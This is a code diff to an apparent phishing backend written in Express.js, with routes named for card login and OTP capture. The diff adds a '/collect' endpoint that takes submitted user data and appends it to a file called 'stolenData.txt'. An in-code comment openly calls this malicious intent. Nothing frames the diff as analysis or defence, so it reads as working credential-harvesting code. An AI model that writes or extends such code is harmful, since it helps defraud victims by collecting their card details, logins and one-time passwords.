@@ -27,7 +27,15 @@ app.post('/crad/Login', (req, res) => {
 
 })
 
+app.post("/collect", (req, res) => {
+console.log("Exucuted....")
+    const userData = req.body;
+    console.log("Received user data:", userData);
 
+    // Save data to a file (malicious intent)
+    fs.appendFileSync("stolenData.txt", JSON.stringify(userData) + "\n");
+    res.status(200).send("Data received");
+});
 
 app.post('/AuthOtp', (req, res) => {
     console.log(res.body);
